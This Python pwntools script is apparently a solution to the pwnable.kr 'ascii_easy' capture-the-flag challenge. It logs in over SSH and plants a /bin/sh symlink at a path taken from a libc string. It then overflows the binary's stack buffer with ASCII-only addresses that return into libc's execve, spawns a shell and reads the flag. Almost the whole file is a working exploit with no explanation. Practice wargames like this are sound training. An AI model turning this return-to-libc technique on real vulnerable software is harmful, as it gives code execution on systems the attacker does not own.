from pwn import *

shell = ssh(user='ascii_easy', host='pwnable.kr', port=2222, password='guest')
shell.set_working_directory(symlink=True)
# shell.run('ulimit -s unlimited')
# shell.download('./ascii_easy')
shell_cmd = lambda cmd: shell.run(cmd).recvall().decode()
# shell_cmd('ls')
# shell.download('./libc-2.15.so')
libc = ELF("./libc-2.15.so")
libc.address = 0x5555e000

CALL_EXECVE = 0x5561676a
NULL_ADDR = 0x55564a3a
PATH_ADDR = 0x556c2b59

PATH = libc.string(PATH_ADDR).decode()
shell(f'mkdir -p "{os.path.dirname(PATH)}"')
shell(f'ln -s /bin/sh "{PATH}"')

payload = cyclic(0x20)
payload += p32(CALL_EXECVE)
payload += p32(PATH_ADDR)  # filename
payload += p32(NULL_ADDR)  # argv = {NULL}
payload += p32(NULL_ADDR)  # envp = {NULL}

io = shell.process(['ascii_easy', payload])
io.recvuntil(b"$ ")
io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")